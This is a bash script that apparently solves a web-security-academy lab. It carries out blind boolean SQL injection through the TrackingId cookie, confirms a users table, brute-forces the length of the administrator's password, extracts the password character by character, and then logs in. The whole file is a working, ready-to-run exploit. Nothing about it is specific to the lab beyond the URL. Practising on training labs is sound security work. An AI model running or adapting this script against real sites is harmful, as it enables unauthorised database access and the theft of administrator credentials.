#!/bin/bash

LAB_URL="https://0a8e008404dc4298807b21f200f800d2.web-security-academy.net/"

# ─── Step 1: Get cookies ───────────────────────────────────────────────────────
echo "[*] Fetching cookies from lab..."
RAW_HEADERS=$(curl -sk -D - -o /dev/null "$LAB_URL")

TRACKING_ID=$(echo "$RAW_HEADERS" | grep -i 'TrackingId' | grep -oP 'TrackingId=\K[^;]+' | head -1)
SESSION=$(echo "$RAW_HEADERS" | grep -i 'session=' | grep -oP 'session=\K[^;]+' | head -1)

echo "[+] TrackingId : $TRACKING_ID"
echo "[+] Session    : $SESSION"
echo ""

# ─── Helper: returns 0 (true) if "Welcome back" appears ──────────────────────
check() {
    curl -sk -b "TrackingId=$1; session=$SESSION" "$LAB_URL" | grep -q "Welcome back"
}

# ─── Step 2: Sanity check ─────────────────────────────────────────────────────
echo "[*] Verifying boolean injection..."

if check "${TRACKING_ID}' AND '1'='1"; then
    echo "[+] TRUE  condition → Welcome back ✓"
else
    echo "[-] TRUE condition failed — check your TrackingId"
    exit 1
fi

if ! check "${TRACKING_ID}' AND '1'='2"; then
    echo "[+] FALSE condition → No Welcome back ✓"
else
    echo "[-] FALSE condition failed — injection may not be working"
    exit 1
fi

echo ""

# ─── Step 3: Confirm users table & administrator exist ───────────────────────
echo "[*] Checking users table exists..."
if check "${TRACKING_ID}' AND (SELECT 'a' FROM users LIMIT 1)='a"; then
    echo "[+] users table confirmed ✓"
fi

echo "[*] Checking administrator user exists..."
if check "${TRACKING_ID}' AND (SELECT 'a' FROM users WHERE username='administrator')='a"; then
    echo "[+] administrator user confirmed ✓"
fi

echo ""

# ─── Step 4: Find password length ─────────────────────────────────────────────
echo "[*] Brute-forcing password length..."
PASSWORD_LENGTH=0

for i in $(seq 1 50); do
    if ! check "${TRACKING_ID}' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>$i)='a"; then
        PASSWORD_LENGTH=$i
        echo "[+] Password length = $PASSWORD_LENGTH"
        break
    fi
done

if [ "$PASSWORD_LENGTH" -eq 0 ]; then
    echo "[-] Could not determine password length"
    exit 1
fi

echo ""

# ─── Step 5: Extract each character ──────────────────────────────────────────
echo "[*] Extracting password (this takes a moment)..."
CHARSET="abcdefghijklmnopqrstuvwxyz0123456789"
PASSWORD=""

for pos in $(seq 1 "$PASSWORD_LENGTH"); do
    for (( i=0; i<${#CHARSET}; i++ )); do
        char="${CHARSET:$i:1}"
        if check "${TRACKING_ID}' AND (SELECT SUBSTRING(password,$pos,1) FROM users WHERE username='administrator')='$char"; then
            PASSWORD="${PASSWORD}${char}"
            echo -ne "\r[+] Progress: $PASSWORD$(printf '%0.s.' $(seq 1 $(($PASSWORD_LENGTH - ${#PASSWORD}))))"
            break
        fi
    done
done

echo ""
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[✓] Administrator password: $PASSWORD"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "[*] Logging in to verify..."

LOGIN_RESPONSE=$(curl -sk -c /tmp/lab_session.txt -b "session=$SESSION" \
    -X POST "$LAB_URL/login" \
    -d "username=administrator&password=$PASSWORD" \
    -D -)

if echo "$LOGIN_RESPONSE" | grep -qi "location: /my-account\|Your username is: administrator\|Log out"; then
    echo "[✓] Login successful! Lab solved."
else
    # Try following the redirect
    FINAL=$(curl -sk -b /tmp/lab_session.txt "${LAB_URL}my-account")
    if echo "$FINAL" | grep -qi "administrator\|Log out"; then
        echo "[✓] Login successful! Lab solved."
    else
        echo "[!] Password found but auto-login check inconclusive."
        echo "    → Go to $LAB_URL/login and use: administrator / $PASSWORD"
    fi
fi
